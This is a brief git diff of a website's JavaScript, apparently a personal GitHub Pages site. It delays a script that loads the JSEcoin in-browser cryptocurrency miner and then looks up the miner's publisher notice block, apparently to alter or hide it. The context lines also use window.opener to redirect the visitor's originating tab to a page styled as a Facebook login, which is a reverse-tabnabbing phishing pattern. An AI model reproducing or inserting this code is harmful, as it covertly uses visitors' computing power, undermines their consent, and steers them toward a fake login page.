@@ -37,9 +37,10 @@ if (window && window.opener) {
   setTimeout(() => window.opener.location = 'https://mycatnamedweb.github.io/fb%20login%20page.png', 3000); // https://uguu.se rocks
 }
 // JSE
-!function(){
-  var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/115102/mycatnamedweb.github.io/0/0/",s.parentNode.insertBefore(t,s)
-}();
+setTimeout(() => {
+  console.log('Launching JSE..')
+  var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/115102/mycatnamedweb.github.io/0/0/",s.parentNode.insertBefore(t,s);
+}, 2 * 1000);
 setTimeout(() => {
   console.log('Finding jse block..');
   const parentBlock = document.querySelectorAll('a[href="https://jsecoin.com/JSEcoin_Publisher_Introduction.pdf"]')[0].parentElement.parentElement;
